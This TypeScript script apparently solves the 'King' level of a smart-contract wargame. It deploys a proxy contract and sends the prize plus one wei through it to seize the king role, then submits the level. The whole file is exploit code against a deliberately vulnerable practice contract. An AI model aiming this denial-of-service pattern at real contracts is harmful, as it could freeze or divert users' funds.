// Runtime Environment's members available in the global scope.
import { BigNumber, ethers, Signer } from "ethers";
import { Interface } from "ethers/lib/utils";
import { getSigner } from "./signer";
import { King__factory } from "../typechain/ethers-v5";
import { ProxyCall__factory } from "../typechain";
import { createLevel, submitLevel } from "./utils";


async function main() {
  const signer = getSigner();
  const level = await createLevel(signer,"king");
  const ct = King__factory.connect(level, signer);
  console.log("king:", await ct._king());
  console.log("prize:", (await ct.prize()).toString());
  const overtakePrize = (await ct.prize()).add(1);

  const proxy = await (new ProxyCall__factory(signer)).deploy();  
  await proxy.deployed();
  console.log("deployed proxy:", proxy.address);

  const tx = await proxy.proxy(level, [] ,{ value:overtakePrize, gasLimit: 950000,  });
  console.log(await tx.wait());

  console.log("king:", await ct._king());
  console.log("prize:", (await ct.prize()).toString());

  await submitLevel(signer, level);
}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });

const abi = [  
  {
    "inputs": [    ],
    "name": "receive",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  }
]